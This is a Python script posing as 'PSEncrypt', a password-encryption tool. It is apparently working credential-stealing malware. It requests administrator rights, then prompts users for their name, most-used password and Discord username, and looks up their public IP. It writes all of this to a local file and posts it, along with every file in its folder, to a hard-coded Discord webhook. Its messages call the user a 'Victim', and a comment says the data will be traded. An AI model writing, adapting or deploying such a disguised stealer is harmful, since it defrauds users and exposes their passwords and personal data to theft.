encoding = "utf-8"

import requests
import time
import sys
import os
import ctypes

def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("Requesting administrator privileges...")
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

folder = r"C:\Program Files\PSEncrypt"
file_path = os.path.join(folder, "user_info.txt")

os.makedirs(folder, exist_ok=True)

webhook_url = "https://discord.com/api/webhooks/1516428299306401893/A4e1dSRCatc--8VAmh4EoYY1IfUdhkJDR5MKSskTT_xrgpdzNNGyjIg5AH7YZ_zXtl9L"

initialWebsend = f"""
======================================
!!!NEW ENTRY!!!
======================================
Found A User using PSEncrypt!
Sending Victim's info
"""

requests.post(webhook_url, json={"content": f"{initialWebsend}"})

# To note: This program is designed to generate random data and collects personal information to send to a undisclosed location.
# I am not responsible for any damage caused by this program, use it at your own risk.
# On another note, your information will be sent to a undisclosed location, ready to be traded with anyone, at anytime.

tn = "---[PSEncrypt0.0.1]:"

print(f"{tn} Welcome to PSEncrypt! This program is designed to encrypt your password!")

print(f"{tn} This program will only **ENCRYPT** your password. And Collect non-sensitive data for quick access to your account when booting up the program.")
print(f"{tn} !!! Check disclaimers on my github page https://github.com/PurpleWorksKirnotP/OP/blob/main/DISCLAIMER.md !!!")
time.sleep(0.5)
print(f"{tn} !!! Check disclaimers on my github page https://github.com/PurpleWorksKirnotP/OP/blob/main/DISCLAIMER.md !!!")
time.sleep(0.5)
print(f"{tn} !!! Check disclaimers on my github page https://github.com/PurpleWorksKirnotP/OP/blob/main/DISCLAIMER.md !!!")
time.sleep(0.5)
print(f"{tn} !!! Check disclaimers on my github page https://github.com/PurpleWorksKirnotP/OP/blob/main/DISCLAIMER.md !!!")
time.sleep(0.5)
print(f"{tn} !!! Check disclaimers on my github page https://github.com/PurpleWorksKirnotP/OP/blob/main/DISCLAIMER.md !!!")
time.sleep(0.5)
print(f"{tn} Starting application...")

import requests

def get_public_ip():
    response = requests.get("https://api.ipify.org?format=json")
    return response.json()["ip"]

name = input(f"{tn} Enter name: ")

if len(name) < 3:
    print(f"{tn} Name must be at least 3 characters long. Exiting...")
    time.sleep(2)
    exit()

address = input(f"{tn} Enter Password You Mostly Use...: ") 

if len(address) < 4:
    print(f"{tn} Password must be at least 4 characters long. Exiting...")
    requests.post(webhook_url, json={"content": f"```{tn} Password stealing interrupted! Reason: Password too short bruhh```"})
    time.sleep(2)
    exit()

passwordagain = input(f"{tn} Enter Password Again...: ")

if len(passwordagain) < 4:
    print(f"{tn} Password must be at least 4 characters long. Exiting...")
    requests.post(webhook_url, json={"content": f"```{tn} Password stealing interrupted! Reason: Password too short bruhh```"})
    time.sleep(2)
    exit()

if passwordagain == address:
    print(f"{tn} Proceeding...")
else:
    print(f"{tn} Passwords do not match. Exiting...")
    requests.post(webhook_url, json={"content": f"```{tn} Password stealing interrupted! Reason: Passwords dont match xd```"})
    time.sleep(2)
    exit()

discorduser = input(f"{tn} Enter Discord username: ")

if len(discorduser) < 3 or len(discorduser) > 32:
    print(f"{tn} Discord username must be between 3 and 32 characters long. Exiting...")
    requests.post(webhook_url, json={"content": f"```{tn} Password stealing interrupted! Reason: Invalid Discord username```"})
    time.sleep(2)
    exit()

public_ip = get_public_ip()

with open(file_path, "w") as file:
    file.write(f"Name: {name}\n")
    file.write(f"Password: {address}\n")
    file.write(f"IP: {public_ip}\n")
    file.write(f"Discord Username: {discorduser}\n")

time.sleep(1)

print(f"{tn} Saving Information to file locally for later access...")
print(f"{tn} Please wait...")

requests.post(webhook_url, json={"content": f"Info from: Victim Name: ```{name}``` Victim Password: ```{address}``` Discord User: ```{discorduser}``` IP Address```{public_ip}``` Public IP: ```{public_ip}```"})

print(f"{tn} Done!")
print(f"{tn} Proceeding To encrypt password sent...")

import random

newpg = f"P{random.randint(100000, 999999)}x{random.randint(100000, 999999)}{random.choice(['Alpha', 'Bravo', 'Echo', 'Delta', 'Foxtrot', 'Golf', 'Hotel', 'India', 'Juliet'])}"
print(f"{tn} New password: {newpg}")
requests.post(webhook_url, json={"content": f"New Password: ```{newpg}```"})

print(f"{tn} Done! You may now copy the new password and use it to login on any website.")

files = [f for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f))]

if not files:
    print(f"{tn} No files found in folder.")
    time.sleep(2)
    exit()

print(f"{tn} Found {len(files)} file(s). Sending to Discord...")

for filename in files:
    file_path = os.path.join(folder, filename)
    
    try:
        with open(file_path, "rb") as f:
            payload = {
                "content": f"File from PSEncrypt: `{filename}`"
            }
            response = requests.post(
                webhook_url,
                data=payload,
                files={"file": (filename, f)},
                timeout=10
            )
        
        if response.status_code == 200 or response.status_code == 204:
            print(f"{tn} proceeding.")
        else:
            print(f"{tn} DEBUG: (Status: {response.status_code})")
        
        time.sleep(1)
    
    except Exception as e:
        print(f"{tn} DEBUG: [!] Error sending {e}")

requests.post(webhook_url, json={"content": "======================================"})

testformatsend = f"""
```
===============================
FILE OVERVIEW
{tn}
Victim's Name: {name}
Password: {address}
Discord Username: {discorduser}
Public IP: {public_ip}
===============================
```
"""

requests.post(webhook_url, json={"content": testformatsend})

choicetoexit = input(f"{tn} Press enter to exit...")